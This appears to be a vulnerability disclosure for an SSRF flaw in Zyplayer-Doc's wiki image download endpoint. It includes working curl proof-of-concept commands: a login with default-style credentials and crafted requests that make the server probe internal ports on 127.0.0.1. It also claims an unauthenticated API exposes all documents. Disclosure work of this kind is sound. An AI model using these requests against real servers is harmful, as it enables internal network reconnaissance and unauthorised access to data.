# Zyplayer-Doc SSRF via Wiki Image Download Vulnerability Report

## Vulnerability Description

Zyplayer-Doc's `WikiPageWebService.download()` parses wiki content with Jsoup, extracts `<img src>` URLs, and downloads them via `HttpUtil.createGet(src).execute()` with zero URL validation. Open API (`WikiOpenApiController`) exposes all documents without authentication.

---

## Affected Versions

Zyplayer-Doc <= 1.0.0

---

## Utilize conditions

- Authenticated page edit + download privilege
- Open API: zero auth, any space UUID

###  SSRFPOC 

**Request (create page):**

```
logn：
curl -c cookies.txt -X POST "http://localhost:8083/login" -H "Content-Type: application/x-www-form-urlencoded" -d "username=zyplayer&password=123456"

SSRF "Detect 'closed port'"
curl -b cookies.txt -s -o NUL -w "closed: %{size_download} bytes" -X POST "http://localhost:8083/zyplayer-doc-wiki/page/download?pageId=1&content=%3Cp%3E%3Cimg%20src%3D%22http%3A%2F%2F127.0.0.1%3A9%2F%22%3E%3C%2Fp%3E" -H "Content-Type: application/x-www-form-urlencoded"

SSRF Detect "open HTTP ports"
curl -b cookies.txt -s -o NUL -w "open: %{size_download} bytes" -X POST "http://localhost:8083/zyplayer-doc-wiki/page/download?pageId=1&content=%3Cp%3E%3Cimg%20src%3D%22http%3A%2F%2F127.0.0.1%3A8083%2F%22%3E%3C%2Fp%3E" -H "Content-Type: application/x-www-form-urlencoded"
```

![image-20260806120626080](https://github.com/fangtang7/picx-images-hosting/raw/master/Zyplayer-Doc/image-20260806120626080.70b1z0xfc6.webp)

![image-20260806120839869](https://github.com/fangtang7/picx-images-hosting/raw/master/Zyplayer-Doc/image-20260806120839869.5flazk0qzm.webp)

**code:**

zyplayer-doc-wiki/src/main/java/org/dromara/zyplayer/wiki/service/WikiPageWebService.java

`WikiPageController` → `POST /zyplayer-doc-wiki/page/download?pageId=1&content=<HTML>`

![image-20260806141806422](https://github.com/fangtang7/picx-images-hosting/raw/master/Zyplayer-Doc/image-20260806141806422.1e9bl5x2a4.webp)

